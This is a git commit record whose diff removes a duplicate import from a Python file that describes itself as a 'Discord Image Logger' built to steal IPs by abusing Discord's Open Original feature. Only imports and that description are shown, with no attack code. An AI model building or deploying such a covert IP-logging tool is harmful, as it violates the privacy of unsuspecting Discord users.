13aa5a11fb975305809c03632d36c6829045dc50
xdesx <95653141+xdesx@users.noreply.github.com>
2023-10-03 22:10:34 +0200

    dza
    azd

--- api/zbi.py
+++ api/zbi.py
@@ -4,7 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-from http.server import BaseHTTPRequestHandler, HTTPServer
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
